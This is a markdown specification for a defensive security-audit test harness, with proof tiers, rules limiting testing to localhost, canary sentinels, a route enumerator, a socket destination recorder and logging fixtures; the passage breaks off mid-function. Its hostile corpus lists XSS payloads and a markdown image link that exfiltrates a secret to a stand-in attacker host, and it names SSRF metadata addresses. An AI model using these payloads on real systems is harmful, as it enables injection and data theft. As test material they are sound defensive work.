# Shared proof harness

This file is a contract, not a lens. It owns no topics, activates on nothing, and the linter skips it. It exists because ten domain lenses independently invented the same handful of test components, and a component described ten times drifts ten ways.

**How a lens uses this file.** A lens's `## Proof recipes` block names a component in a sentence and moves on — "seed the record with a distinctive marker from the **canary fixture set**", "enumerate the cases with the **registry-driven enumerator**". The name is the whole citation. The implementation is here, once, and an auditor must be able to build it from this file alone without reading the lens that cited it.

**How to read a component section.** Each says what the component does, which proof tier it supports, what breaks if you build it wrong, a concrete sketch in one language, and a porting note. The sketches are illustrative and deliberately small. Where a sketch encodes a correctness trap — a hook that misses a literal-IP connection, a buffer that truncates a build log, a frozen clock the database never sees — that trap is stated in prose beside the code, because it is the part that decides whether a green test means anything.

Two ideas run through every component and are worth stating once:

- **A sweep that finds nothing and a sweep that ran against nothing look identical.** Every enumerator, collector and canary sweep here carries a self-check — a committed count, a planted marker, a collected-bytes manifest — for exactly that reason. Build the self-check first.
- **Assert on the decision and the side effect, never on a log line.** A handler that refuses after streaming has still leaked. A model that politely declines still received the foreign tenant's text. A server that executes and then truncates is still vulnerable. The recorded call, the recorded destination, the recorded row count: those are the assertions.

---

## Proof tiers

Tier describes **what evidence exists**. Capability mode describes **what the skill is permitted to do**. They are orthogonal, and conflating them is what made an earlier "restricted mode" meaningless — see `## Hard rails`.

| Tier | Mechanism | Severity cap | Capability mode required |
|---|---|---|---|
| **T0** | Static reasoning with a cited code path | **Medium** | Static |
| **T1** | A detector or failing test executed by the project's own test runner | none | Test execution |
| **T2** | The application booted locally, a real request to a loopback socket | none | Local dynamic |
| **T3** | A written proof-of-concept, never executed, tagged `UNPROVEN` | **Medium** | Static |

**Record the tier actually reached, never the tier attempted.** A T1 recipe that never ran does not land at T1. It lands at whatever its surviving evidence supports — T0 where a code path is cited, T3 where a runnable proof-of-concept was written and left unexecuted — with `verification_status` carrying the blocking reason. Recording the ambition rather than the result is how a Medium-capped finding escapes its cap.

**Existence precedes tier, and it is an ordering rule.** Before a tier is assigned and before any argument about reachability, enforcement or impact, the cited artifact is opened at the cited location and the quoted evidence is confirmed present there. A finding whose artifact cannot be located is `NOT_REPRODUCED` and leaves the queue — no tier, no severity, however plausible the reasoning. The order is what matters, because effort is not the failure mode: two readers attacking a finding from opposite sides, neither of whom opened the file, produce one unchecked premise argued twice rather than two verifications. `_schema.md` → `## The proof oracle` states the rule, the three outcomes and the `existence_check` field that records it.

### T0 — static reasoning with a cited code path

The floor. A quoted line, a named file, a stated path from an entry point to it, and an argument. Caps at **Medium** no matter how obvious the bug is, because an argument that has never met the code's actual behaviour is a hypothesis.

**The quoted line has to have been read, in this checkout, at the location cited.** An argument over an artifact nobody opened is not T0 — it is not evidence at any tier, and it grades `NOT_REPRODUCED` rather than landing at the floor. This is the one thing T0 cannot borrow from a plausible reading of the finding it inherited.

T0 is not a failure state. Most of `threat-modeling` is permanently T0 — you cannot write a test that fails because an analysis is absent — and several lenses have whole topics that can never leave it. What T0 must not do is masquerade: an `rg --files` result showing an enforcement artifact is missing is T0, even though a command ran, because nothing asserted anything about behaviour.

### T1 — executed by the project's own test runner

`pytest`, `npm test`, `go test`, `mvn test` — the command the repository already runs. Includes the case where that command boots an ephemeral dependency it already boots: SQLite, a testcontainers Postgres, an emulator the existing test script starts. It does **not** include a dependency the auditor stands up; that is T2.

**The static-checker resolution, which is load-bearing for two lenses' severities.** A static checker counts as **T1, not T0**, when the repository's own runner executes it *and* it asserts **both** directions:

```
detect(fixtures/vulnerable/X) == 1   and   detect(fixtures/clean/X) == 0
```

One direction is not enough, and the missing direction is always the same one. A checker that only passes on clean input proves that the rule *runs*, not that it *fires* — which is precisely how a scanner reports clean for years. See `## Detector-and-fixture-pair runner` for the mechanics, including the extra assertion that absence-shaped rules need.

Without this resolution almost every `cicd-and-supply-chain` and `cloud-and-iac` finding caps at Medium the moment the hard rails remove the dynamic half, and the skill systematically under-rates its two largest-blast-radius domains. `cicd-and-supply-chain` states in its own tier rule that this resolution is what makes its Critical grades provable at all.

### T2 — booted locally, real request to a loopback socket

The application running on a port the skill owns, on `127.0.0.1`, with a disclosed boot manifest and guaranteed teardown. Also covers infrastructure the auditor stands up locally: kind or k3d, LocalStack, a local package registry, an Android emulator, a headless browser against a booted dev server.

**T2 is opt-in and the skill asks before booting anything, every time.** Asked before the proof phase, per audit, never remembered — the correct answer depends on what the repository is wired to *today*, not on what it was wired to last week. Where the user declines, the finding is reported at the tier it reached with `verification_status: UNPROVEN` and the blocking reason recorded. It is never reported as clean.

Expect most audits to decline. Say so in the coverage block rather than letting the absence of T2 evidence read as an absence of risk.

### T3 — a written proof-of-concept, never executed

An artifact — a test file, a request script, an Apex test class — that would demonstrate the finding if it ran, committed to the security test directory, never executed, tagged `UNPROVEN`, capped at **Medium**.

**T3 exists because the alternative is worse.** Where the only runner is out of rails, the choice is between a finding the user can verify with one command they run themselves, and a paragraph of prose. T3 is the first of those. It is strictly more useful than T0 and should be preferred wherever the proof-of-concept can actually be written.

Three rules make T3 honest:

- **`proof_tier: T3` always pairs with `verification_status: UNPROVEN`.** It is the only tier where the status follows from the tier, because nothing ran. The converse does not hold: `UNPROVEN` also appears at T0 and T1 when an attempt was blocked.
- **The blocking reason is named**, in the finding, every time. "The runner is a remote host." "The user declined the boot." "The engine the assertion needs is stubbed in this repository."
- **A finding may have both a cited code path and an unexecuted proof-of-concept.** Record T3, because it is the stronger artifact, and keep the cited line in `evidence` where it belongs.

**On `salesforce-platform`'s inline definition.** That lens had to define T3 in its own tier rule because the rule it inherited never defined one: *"Apex tests execute only inside an org, and an org is a remote host. Under this skill's hard rails the auditor writes the Apex test and does not run it. Every Apex recipe below therefore lands at T3 UNPROVEN, capped at Medium, unless the user explicitly runs `sf apex run test` themselves and pastes the result."*

**The definition here does not diverge from it.** Same mechanism, same cap, same status. Two clarifications the canonical form adds:

1. Salesforce writes "T3 UNPROVEN" as a compound label. In the record these are two fields — `proof_tier: T3` and `verification_status: UNPROVEN` — and both are written. The compound reads well in prose; it is not a value.
2. Salesforce's escape hatch is exactly right and generalizes: where the user runs the unexecuted proof themselves and pastes the result, the finding leaves T3. Which tier it lands at follows from what they ran, and the report says who ran it. An Apex test the user executed in their own org is evidence the auditor did not produce and must attribute.

The one thing not to generalize from that lens is the cause. Salesforce is at T3 because its runner is unreachable under the rails. Most T3 findings elsewhere are at T3 because the user declined a boot, which is a different sentence in the coverage block.

---

## Hard rails

These are not tiers. A tier is what evidence you have; a rail is what you do not do at any tier, with any consent, in any mode. They bind every recipe in every lens.

**1. Targets are files in this repository and `localhost`. Nothing else, ever.**

Never a remote host. Never a staging URL. Never "just curl it to check". And specifically: **never a hostname read from configuration.** A `DATABASE_URL`, an `API_BASE`, a Terraform backend address, an org login URL, an entry in a `baa_approved_hosts.yml` allowlist — every one of those is an input to a *static* assertion and never a destination. Reading the value out of the repository is the audit; connecting to it is the violation. That the value came from a file in the checkout does not make the host it names a permitted target.

**2. No destructive payloads.**

A proof demonstrates reachability and authorization, not damage. No `DROP`, no `TRUNCATE`, no unbounded `UPDATE`, no `rm -rf`, no mail send, no payment call, no message to a real recipient. Where a bug class can only be shown by causing damage, the recipe is written and left unexecuted at T3.

**3. Security tests live in their own directory and never edit the project's existing tests.**

`test/security/` — or the repository's own convention with a `security` leaf — holding the harness, the fixtures and the proofs. Where a lens writes `fixtures/vulnerable/X`, it means `test/security/fixtures/vulnerable/X`.

Adding an assertion to an existing test file breaks the oracle: the pre-patch and post-patch commands are no longer the same string, and the project's own regression signal is now entangled with the audit's. Both halves of that matter.

**A separate directory is not containment.** The run still writes coverage files, snapshots, caches, local databases, migration state, and whatever child processes decide to write. Proof work therefore belongs in a disposable mirror or worktree, with the original index preserved byte-for-byte, and the audit returns a manifest of owned paths rather than a mutated repository.

**4. Never commit.**

No `git commit`, no `git push`, and no `git add` as a side effect of anything. A bulk `git add` against a file with partially staged hunks destroys a carefully split index. Staging is supported only for named files after explicit approval.

**5. Never source production credentials.**

The skill inherits the environment it was handed and does not go hunting for more. It does not read `~/.aws`, does not unseal a vault, does not source `.env.production`, does not log in to an org to make a stubborn proof succeed. A proof that cannot run without a credential it was not given returns `INCONCLUSIVE`, which is a more useful result than a proof that reached production to get a green tick.

**6. Install the destination guard first.**

Before running anything that could open a socket, install the guard from `## Socket-layer destination recorder` so an unexpected connection **fails loudly instead of quietly reaching the internet**. This is not isolation and must not be described as isolation — see the disclosure note below — but it converts a silent egress into a failed assertion, which is the difference between finding out now and finding out never.

### The rewritten recipe, recorded so it is not reintroduced

`salesforce-platform`'s guest-access recipe originally instructed the auditor to send unauthenticated requests to a live Experience Cloud site. That reaches a remote host and violates rail 1 outright. It was rewritten as a computation over the checkout: resolve the guest profile by its license, compute its effective object and field permissions from the profile plus any permission set assigned to it, intersect that with the Apex classes it can call, read each object's sharing model, and assert the reachable set is a subset of a committed allowlist of objects the site is *intended* to publish. That runs offline, and it is **T1**.

**"Use a scratch org" is not an exemption.** Neither is "it's a sandbox", "it's an org I own", or "it's a test tenant". Every one of those re-introduces the same violation under a friendlier name: the request still leaves the machine and still arrives at a host the repository does not start. Unauthenticated probing of a running site is authorized-penetration-test activity governed by a scope agreement — it requires **written authorization naming the site, scoped and dated, obtained before the first request** — and it happens outside this skill.

**The T2 consent prompt is not that authorization and must never be presented as if it were.** Asking "may I boot the app locally?" and receiving yes does not authorize a request to a hosted endpoint. Treating the prompt as authorization would have the skill walk an auditor into unauthorized testing while showing them a consent dialog.

The same reasoning retired a family of recipes in `cicd-and-supply-chain` and `cloud-and-iac` — a real pull request against a hosted forge, a canary sent to a hosted request bin, a force-moved tag in a live organization, provider-API log downloads, credentialed cloud API calls, metadata probes from a launched instance. Each lens records its own list in place. Two of them exfiltrated a sentinel to a third party, which is why the collector in this file only ever walks locally produced output.

### This is disclosure, not a sandbox

Test execution runs the repository's own command with the repository's own environment. If that setup applies migrations, starts containers, emits telemetry or points at shared infrastructure, the audit does all of it — because it is running the command the owner runs. The skill does not sandbox anything and does not pretend to. State in the finding that the run happened and under whose consent. Anyone who needs real isolation runs the audit in a container or a VM.

---

## Canary fixture set

**What it does.** Supplies the marker values a proof plants and then hunts for, the hostile payloads a proof feeds in, and — the part that carries the weight — the **derived-encoding expander** that turns one marker into the set of forms a sink might actually contain.

The literal is what a masker or scrubber already catches. The encodings are what it misses. A sweep for `MRN-CANARY-8675309` alone clears a logger that base64s its payload, and that logger is the finding.

The set has two halves, and lenses cite both under this one name:

- **Sentinels** — values you write in and search for. One per data class, so a hit names which class leaked: `MRN-CANARY-8675309`, `DX-CANARY-F33-1`, `canary+pii@example.test`, `SENTINEL-DOB-1971-03-04`, `PAN-CANARY-4000056655665556`, `SENTINEL-TOKEN-<run>`, and a per-subject marker for the two-subject fixture.
- **Hostile corpus** — payloads you feed in and assert the *shape* of the output: `<img src=x onerror="window.__pwned=1">`, `[click](javascript:alert(1))`, `![x](https://attacker.test/p?d=SECRET)`, an `<iframe>`, a data-URI SVG, a `</script>` breakout inside a JSON value. Hosts in the corpus are always `.test` or `.invalid`, which are reserved and resolve nowhere.

**Tier.** Supports T1, and T2 where the sweep runs against a booted application or a built image. Not itself a tier.

**Build the self-check first.** Assert that the sweep finds a deliberately planted canary in a fixture you control. Without that, a sweep that returned nothing because it was pointed at the wrong sink is indistinguishable from a clean result — and it will be read as a clean result.

```javascript
// test/security/harness/canaries.mjs
import { gunzipSync } from 'node:zlib'

// One sentinel per data class. Fixed literals, not random, so a hit in a log
// tail six months from now is still identifiable. RUN_TAG distinguishes this
// audit's writes from a sentinel someone left behind in a seed file.
const RUN_TAG = process.env.AUDIT_RUN_TAG ?? 'R1'

export const CANARY = {
  phi_mrn:      'MRN-CANARY-8675309',
  phi_dx:       'DX-CANARY-F33-1',
  pii_email:    'canary+pii@example.test',
  pii_dob:      'SENTINEL-DOB-1971-03-04',
  pan:          'PAN-CANARY-4000056655665556',
  secret_token: `SENTINEL-TOKEN-${RUN_TAG}-9f2c41d0`,
  marker_a:     `CANARY-SUBJECT-A-${RUN_TAG}`,
  marker_b:     `CANARY-SUBJECT-B-${RUN_TAG}`,
}

export const HOSTILE = [
  '<img src=x onerror="window.__pwned=1">',
  '[click](javascript:alert(1))',
  '![x](https://attacker.test/p?d=SECRET)',
  '<iframe src="https://attacker.test/"></iframe>',
  'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+',
  '{"note":"</script><script>window.__pwned=1</script>"}',
]

// Every form the same value can wear on its way into a sink. `label` is what
// the assertion message prints, and it is the useful half of the failure:
// "leaked as base64url" and "leaked as literal" are different bugs.
export function derivedForms(value) {
  const b = Buffer.from(value, 'utf8')
  const b64 = b.toString('base64')
  return [
    { label: 'literal',         text: value },
    { label: 'base64',          text: b64 },
    { label: 'base64-unpadded', text: b64.replace(/=+$/, '') },
    { label: 'base64url',       text: b.toString('base64url') },
    { label: 'hex',             text: b.toString('hex') },
    { label: 'hex-upper',       text: b.toString('hex').toUpperCase() },
    { label: 'url-encoded',     text: encodeURIComponent(value) },
    { label: 'json-escaped',    text: JSON.stringify(value).slice(1, -1) },
    { label: 'reversed',        text: [...value].reverse().join('') },
  ]
}

// Returns the first form found, or null. Two searches beyond the forms above,
// each catching a real masker bypass:
//   - whitespace-stripped, for a value split across a line wrap
//   - decompressed, for a gzipped sink (see the caveat below)
export function sweep(haystack, value, { alsoDecompress = null } = {}) {
  const text = Buffer.isBuffer(haystack) ? haystack.toString('latin1') : String(haystack)
  for (const form of derivedForms(value)) {
    const at = text.indexOf(form.text)
    if (at !== -1) return { ...form, at }
  }
  const squeezed = text.replace(/\s+/g, '')
  if (squeezed.includes(value.replace(/\s+/g, ''))) return { label: 'split-across-whitespace', at: -1 }
  if (alsoDecompress) {
    const inner = sweep(gunzipSync(alsoDecompress).toString('latin1'), value)
    if (inner) return { ...inner, label: `gzip>${inner.label}` }
  }
  return null
}

export function assertAbsent(haystack, value, where, opts) {
  const hit = sweep(haystack, value, opts)
  if (hit) throw new Error(`canary leaked into ${where} as ${hit.label} at offset ${hit.at}`)
}
```

**On gzip.** Several lenses list `gzip+base64` among the derived encodings. Searching a sink for `gzip(value)` only works if the value was compressed *on its own* — a compressed single field. For a compressed body, the value's bytes are interleaved with everything else and no substring search will find them; you must decompress the sink and sweep the result, which is what `alsoDecompress` is for. Deflate output also varies with library version and compression level, and the gzip header carries an OS byte, so a checked-in expected ciphertext is not portable. Decompress; do not precompute.

**On `latin1`.** A sink may be a tarball, an image layer or a binary log. Decoding it as UTF-8 replaces invalid bytes with `U+FFFD` and can destroy the very byte sequence you are looking for. `latin1` is a lossless byte-to-char mapping and makes `indexOf` a byte search.

**Porting note.** Python: `base64.b64encode` / `urlsafe_b64encode` (strip `=` explicitly — Python keeps the padding), `binascii.hexlify`, `urllib.parse.quote`, `json.dumps(v)[1:-1]`, `gzip.decompress`; open binary sinks with `mode="rb"` and search `bytes`, not `str`. Go: `encoding/base64` with both `StdEncoding` and `RawURLEncoding`, `encoding/hex`, `net/url.QueryEscape`, `bytes.Contains`. Shell fallback for a sweep over a build directory: `grep -rFaob` — `-a` treats binaries as text, `-b` prints the byte offset, `-F` keeps the payload from being read as a pattern.

**Cited by** all ten domain lenses.

---

## Registry-driven enumerator

**What it does.** Returns the list of things the hostile case is parametrized over, read out of the framework's own registry rather than hand-written. Routes and their methods, GraphQL fields, gRPC methods, queue consumers, scheduled jobs, model and serializer fields, personal-data stores, tool definitions, component bundles, platform entry points.

Hand-written case lists are complete on the day they are written and never again. The enumerator is what makes a sweep a *regression gate*: the day someone adds an unguarded route, an unregistered column or a new tool, the test fails instead of the sweep silently not covering it.

**Tier.** T1. This is the component that makes the two-subject sweep, the canary sweep and the render assertion complete rather than anecdotal.

**Three details are non-negotiable, and each one has a failure mode that looks like a pass.**

1. **Assert the discovered count against a committed number.** An enumerator that silently returns zero rows passes every parametrized test in the suite. This single assertion is worth more than the tests it feeds. A committed count of zero is rejected outright, so nobody can satisfy the check by committing the broken state.
2. **Allowlist entries are anchored patterns, never prefix matches.** Ship the self-test: a `/public` exemption must not match `/publications/secret`. `startswith` is the default mistake and it silently exempts a family of routes nobody reviewed.
3. **Enumerate from the runtime registry where one exists.** Where it does not — a compiled platform, a source-only audit — the enumerator becomes a source parse, and its count assertion matters *more*, not less: an entry point registered by a mechanism the parser does not model is invisible. Say which method you used in the finding.

```javascript
// test/security/harness/enumerate.mjs
import { readFileSync } from 'node:fs'

const COUNTS = JSON.parse(readFileSync(new URL('./expected-counts.json', import.meta.url), 'utf8'))

// Express keeps the mount prefix only in the layer's compiled regexp, which is
// why this is fragile and why the count assertion below is load-bearing rather
// than decorative. Prefer a framework listing (`fastify.printRoutes()`,
// `app.url_map.iter_rules()`) wherever one is offered.
function mountPrefix(layer) {
  const src = layer.regexp?.source ?? ''
  if (src === '^\\/?(?=\\/|$)') return ''
  return src
    .replace(/^\^/, '').replace(/\\\/\?\(\?=\\\/\|\$\)$/, '')
    .replace(/\\\//g, '/').replace(/\(\?:\(\[\^\\\/\]\+\?\)\)/g, ':param')
}

export function expressRoutes(app) {
  const found = []
  const walk = (stack, prefix) => {
    for (const layer of stack ?? []) {
      if (layer.route) {
        for (const [method, on] of Object.entries(layer.route.methods)) {
          if (on) found.push({ method: method.toUpperCase(), path: prefix + layer.route.path })
        }
      } else if (layer.handle?.stack) {
        walk(layer.handle.stack, prefix + mountPrefix(layer))
      }
    }
  }
  walk(app.router?.stack ?? app._router?.stack, '')
  return found
}

// Anchored, always. A pattern is a full-string match or it is not an exemption.
export const anchored = (patterns) => patterns.map((p) => new RegExp(`^(?:${p})$`))
export const isExempt = (value, allowlist) => allowlist.some((re) => re.test(value))

// The gate every enumeration passes through before it is parametrized over.
export function enumerated(kind, members) {
  const expected = COUNTS[kind]
  if (expected === undefined) {
    throw new Error(`enumerator "${kind}" has no committed count — add one to expected-counts.json`)
  }
  if (members.length === 0) {
    throw new Error(`enumerator "${kind}" returned zero rows; the sweep below would vacuously pass`)
  }
  if (members.length !== expected) {
    throw new Error(
      `enumerator "${kind}" discovered ${members.length}, committed ${expected}. ` +
      `Either the enumerator broke or the surface changed — update the count in a reviewable diff.`,
    )
  }
  return members
}
```

```javascript
// The self-test that keeps the allowlist honest. Ship it beside the enumerator.
test('a /public exemption does not match /publications/secret', () => {
  const allow = anchored(['/public', '/public/.*'])
  assert.equal(isExempt('/public', allow), true)
  assert.equal(isExempt('/public/terms', allow), true)
  assert.equal(isExempt('/publications/secret', allow), false)
})
```

**Porting note.** Flask: `app.url_map.iter_rules()`, and read `rule.methods` — it includes the `HEAD`/`OPTIONS` Flask added for you, which you usually want to filter. Django: walk `django.urls.get_resolver().url_patterns` recursively; nested `URLResolver` instances are the part hand-rolled walkers miss. Rails: `Rails.application.routes.routes`. Spring: `RequestMappingHandlerMapping.getHandlerMethods()`. GraphQL: walk the schema's type map and take the fields of every object type, not just `Query` — a sensitive field on a nested type is reachable through any parent that returns it. gRPC: the service descriptor. ORM and serializer fields: `Model._meta.get_fields()`, and for Pydantic v2 read **`model_fields`** — v1's `__fields__` is deprecated and a harness that reads only `__fields__` enumerates nothing on a v2 model, which is a zero-row pass. Salesforce: there is no offline runtime registry, so parse `classes/*.cls` for `@AuraEnabled`, `@RestResource` and `@InvocableMethod`, and list the component bundle directories; the count assertion is the only thing standing between you and a missed entry point.

**Cited by** `cloud-and-iac`, `crypto-and-key-management`, `hipaa-and-phi`, `llm-and-ai`, `privacy-and-data-protection`, `salesforce-platform`, `threat-modeling`, `web-and-api`.

---

## Socket-layer destination recorder

**What it does.** Hooks name resolution and connection establishment *beneath* the HTTP client, so every outbound destination is recorded whichever library opened it, and so a destination that is not on the allowlist **fails the test** rather than quietly reaching the internet.

Two duties, and both are the point: record the set, and deny by default. The recorded set answers "what does this system talk to" — a destination *inventory*, which is the question several lenses ask. The denial is what keeps a proof run from performing the exfiltration it is testing for.

**Tier.** T1. It is also the safety mechanism that makes a T1 or T2 run *safer* than an unmonitored `npm test` — and it is disclosure, not isolation. It fails loudly on an unexpected connection; it does not prevent a determined one.

**Four traps, each of which produces a clean-looking result on vulnerable code.**

1. **Hooking name resolution alone is blind to a literal IP.** `http://169.254.169.254/`, `http://2130706433/`, `http://[::1]/` — none of these resolve anything, so a recorder that only patches `getaddrinfo` sees nothing and reports clean against exactly the SSRF corpus it was built for. Patch the connect path too.
2. **Install before the application imports its clients.** A module that bound `create_connection` at import time holds the original function and escapes a later patch.
3. **Loopback is not implicitly allowed.** A test that means to reach the application's own server says so. Otherwise a stray connection to a local service on a port nobody expected reads as noise instead of as a finding.
4. **Record resolutions separately from connections.** The DNS-rebinding assertion — the one that separates a real pinned-IP dialer from a hostname regex — needs both: the answer the code validated and the address it actually connected to. If you only keep one list you cannot make the assertion.

```python
# tests/security/harness/destinations.py
import re
import socket
from contextlib import contextmanager

class UnexpectedDestination(AssertionError):
    pass

@contextmanager
def recording_destinations(allow=()):
    """Record every attempted destination; refuse any not on `allow`.

    `allow` holds (host_pattern, port_or_None) pairs. host_pattern is a fully
    anchored regex string -- a prefix would exempt a family of hosts nobody
    reviewed, which is the same mistake the enumerator's allowlist forbids.

    Loopback is NOT allowed implicitly. Pass it in when you mean it.
    """
    resolved, connected = [], []
    rules = [(re.compile(rf"^(?:{h})$"), p) for h, p in allow]

    real_getaddrinfo = socket.getaddrinfo
    real_create_connection = socket.create_connection
    real_connect = socket.socket.connect
    # socket.socket inherits connect() from the C type. Reassigning it on the way
    # out would leave a permanent shadowing attribute rather than restoring the
    # inherited method, so record whether the override was ours to remove.
    shadowed_connect = "connect" not in socket.socket.__dict__

    def permitted(host, port):
        return any(pat.match(str(host)) and (p is None or p == port) for pat, p in rules)

    def guard(host, port, log):
        log.append((str(host), port))
        if not permitted(host, port):
            raise UnexpectedDestination(
                f"outbound connection to {host}:{port} is not on the allowlist"
            )

    def fake_getaddrinfo(host, port, *a, **kw):
        guard(host, port, resolved)
        return real_getaddrinfo(host, port, *a, **kw)

    def fake_create_connection(address, *a, **kw):
        guard(address[0], address[1], connected)
        return real_create_connection(address, *a, **kw)

    def fake_connect(self, address):
        # An AF_UNIX address is a str, not a (host, port) tuple. Let it through
        # untouched rather than crashing on address[1]; a unix socket is not an
        # egress destination and a TypeError here would look like a test bug.
        if isinstance(address, tuple) and len(address) >= 2:
            guard(address[0], address[1], connected)
        return real_connect(self, address)

    socket.getaddrinfo = fake_getaddrinfo
    socket.create_connection = fake_create_connection
    socket.socket.connect = fake_connect
    try:
        yield {"resolved": resolved, "connected": connected}
    finally:
        socket.getaddrinfo = real_getaddrinfo
        socket.create_connection = real_create_connection
        if shadowed_connect:
            del socket.socket.connect
        else:
            socket.socket.connect = real_connect
```

Two further entry points this sketch does not cover, stated rather than left to be discovered: `socket.socket.connect_ex`, which some clients use for a non-raising connect, and `sendto`, which a UDP exporter uses without connecting at all. A statistics or trace exporter shipping over UDP is invisible to the recorder above. Extend it or name the gap in the finding.

Two assertions worth writing out, because they are the ones that separate a fix from a regex:

```python
def test_destination_set_is_a_subset_of_the_register(client, register):
    with recording_destinations(allow=[("127\\.0\\.0\\.1", None), *register]) as seen:
        exercise_every_personal_data_path(client)
    unexpected = {h for h, _ in seen["connected"]} - {h for h, _ in register_hosts(register)}
    assert not unexpected, f"undeclared destinations: {sorted(unexpected)}"

def test_connects_to_the_address_it_validated(client, rebinding_resolver):
    # Answer public on the first lookup, 127.0.0.1 on the second. This passes
    # only if the code connects to the address it validated, which is the whole
    # point of a pinned-IP dialer.
    with recording_destinations(allow=[("203\\.0\\.113\\.10", None)]) as seen:
        client.post("/fetch", json={"url": "http://rebind.test/"})
    assert ("127.0.0.1", 80) not in seen["connected"]
```

**Porting note.** Node: `nock.disableNetConnect()` covers `http`/`https` only, so `fetch`/`undici` and raw `net` calls walk straight past it — layer an `undici` `MockAgent` (`setGlobalDispatcher`) *and* a guard on `net.Socket.prototype.connect` plus `dns.lookup`. Go: there is no global to monkeypatch; inject a `DialContext` on the `http.Transport` and a custom `net.Resolver`. Where the code offers no seam to inject one, *that is itself the finding* — an HTTP client constructed inline with `http.DefaultTransport` cannot be constrained by anything, at test time or in production. JVM: the `SecurityManager` is gone; use a `ProxySelector`, a custom `SocketImplFactory`, or run the suite against a local recording proxy. Off-the-shelf: `pytest-socket` with `socket_allow_hosts` gives you the denial with no code; add this recorder when you need the recorded *set* and not only the refusal.

**Cited by** `cloud-and-iac`, `hipaa-and-phi`, `llm-and-ai`, `mobile-app-security`, `privacy-and-data-protection`, `threat-modeling`, `web-and-api`.

---

## Two-subject fixture

**What it does.** Builds two complete principals in two tenants, each owning a record seeded with its own canary marker, plus the session or credential for each — so any authorization recipe can request A's identifier as B and assert both halves: the status is a refusal **and** A's marker appears nowhere in the response, the headers, or any file the request produced.

Status alone is not the assertion. A handler that returns 403 after streaming the body has still leaked. A serializer that returns the object inside an error envelope has still returned it.

**Tier.** T1 where the application's own test client can create the subjects. T3 on a platform whose test runner is out of rails — `salesforce-platform`'s Apex form of this fixture is written and not executed.

**Five things the fixture must do.**

1. **Create both subjects through the application's own path**, not by direct insert, so the objects carry whatever tenant scoping the application actually applies. A hand-inserted row can be scoped more tightly than the app would scope it, and the sweep then passes on vulnerable code.
2. **Give each record a distinct marker**, so a leak names its source rather than telling you only that *something* leaked.
3. **Include a record B legitimately owns.** Without the positive case, a handler that refuses everything passes the whole sweep.
4. **Return the identifiers and the markers together.** The assertion needs both, and a fixture that returns only ids pushes the marker lookup into every test.
5. **Do not let the sweep become order-dependent.** A session-scoped fixture plus one test that mutates A's record makes every later assertion depend on execution order. Either scope it per test or restore state between tests, and reset any limiter or cache store in the same fixture.

```python
# tests/security/harness/subjects.py
import pytest
from .canaries import CANARY, sweep

@pytest.fixture
def two_subjects(app_client):
    """orgA{user_a, resource_a} / orgB{user_b, resource_b}, built through the
    application's own creation path so tenant scoping is whatever the app does.

    Function-scoped on purpose: a session-scoped version is faster and makes the
    suite order-dependent the first time a test mutates resource_a.
    """
    a = create_tenant(app_client, "orgA")
    b = create_tenant(app_client, "orgB")
    return Subjects(
        a=a, b=b,
        resource_a=create_resource(app_client, actor=a.user, marker=CANARY["marker_a"]),
        resource_b=create_resource(app_client, actor=b.user, marker=CANARY["marker_b"]),
    )

def assert_refused_and_silent(response, marker, produced_files=()):
    """Both halves. Either alone clears vulnerable code."""
    assert response.status_code in (403, 404), (
        f"expected a refusal, got {response.status_code}"
    )
    sinks = {
        "body": response.text,
        "headers": repr(dict(response.headers)),
        **{f"file:{p}": p.read_text() for p in produced_files},
    }
    for where, text in sinks.items():
        hit = sweep(text, marker)
        assert hit is None, f"foreign marker leaked into {where} as {hit['label']}"
```

Three variants belong in the same harness, because each catches a distinct bug and none of them is the plain read:

- **Client-supplied identity.** Send `{"tenant_id": <A>}` or `{"userId": <victim>}` as B and assert the request is refused rather than honoured.
- **No tenant at all.** Omit the tenant header or claim entirely and assert an error — this is what catches "no tenant" resolving to "all tenants".
- **Every verb the registry says the route accepts**, plus the bulk and export routes for the same resource, enumerated rather than hand-listed.

**Porting note.** Node: a `beforeEach` returning the same shape, driven through supertest against the app instance. Django: two `Client()` instances with the fixture inside `pytest.mark.django_db`. Where the boundary is not HTTP, assert one layer lower: for a retrieval pipeline, spy on the retriever and assert A's marker was never in the candidate set — a client-side filter drops the chunk before the prompt is assembled, so a prompt-only assertion passes on vulnerable code. Salesforce Apex: `@TestSetup` creating two users, the call wrapped in `System.runAs(minimalAccessUser)` (outside a `runAs` block the test runs as the deploying administrator and proves nothing about sharing), and the field-level assertion written as `Assert.isFalse(result[0].isSet('SSN__c'))`, which distinguishes a genuine `stripInaccessible` from the cosmetic `record.SSN__c = null` that leaves the field set and merely blanks the value. That form is T3 under the rails.

**Cited by** `crypto-and-key-management`, `llm-and-ai`, `salesforce-platform`, `web-and-api`. Also referenced by name from `hipaa-and-phi`'s minimum-necessary recipe, which runs the same shape for a different assertion.

---

## Capturing log handler

**What it does.** Attaches to the **real** logger and keeps what would actually have been written, so formatters, serializers, processors and scrubbers all run. A mock logger proves nothing about a formatter, and the formatter is usually where the leak is — a `%s` on a whole model, a JSON encoder that walks every field, an exception renderer that includes the request body.

Keep two things per record, not one: the **rendered** line (what reaches the sink) and the **raw** record with its `extra` and args (what the scrubber received). A scrubber that redacts the message and leaves the value in a structured field shows up only if you kept both.

**Tier.** T1.

**Four traps.**

1. **Level filtering looks like a clean sink.** Raise the captured logger to `DEBUG` for the duration, and record that you did — the production level is context for the finding, not a result.
2. **`propagate = False` on an application logger means a root handler sees nothing.** Attach to the logger the application actually uses. The enumerator can hand you the list.
3. **Run the forced-exception path.** The handler that logs the whole request body is almost always the error handler, and a happy-path-only sweep never reaches it.
4. **A vendor transport is a sink too.** Stub the vendor's **transport**, not its API, so the vendor's own scrubbing actually runs — then sweep what the transport was handed. The capturing handler and the transport stub are siblings feeding one sweep.

```python
# tests/security/harness/logs.py
import logging
from contextlib import contextmanager

class Capture(logging.Handler):
    def __init__(self):
        super().__init__(level=logging.NOTSET)
        self.records = []   # raw: .args, .extra, .exc_info -- what the scrubber saw
        self.rendered = []  # formatted: what would have been written

    def emit(self, record):
        self.records.append(record)
        self.rendered.append(self.format(record))

    def sinks(self):
        """Every haystack this capture produced, named for the failure message."""
        return {"rendered": "\n".join(self.rendered),
                "structured": "\n".join(repr(vars(r)) for r in self.records)}

@contextmanager
def capturing_logs(logger_name=""):
    """Attach to the real logger, borrowing the application's own formatter so
    the captured text is what would have been written rather than str(record)."""
    logger = logging.getLogger(logger_name)
    cap = Capture()
    formatted = [h.formatter for h in logger.handlers if h.formatter is not None]
    cap.setFormatter(formatted[0] if formatted else logging.Formatter("%(message)s"))

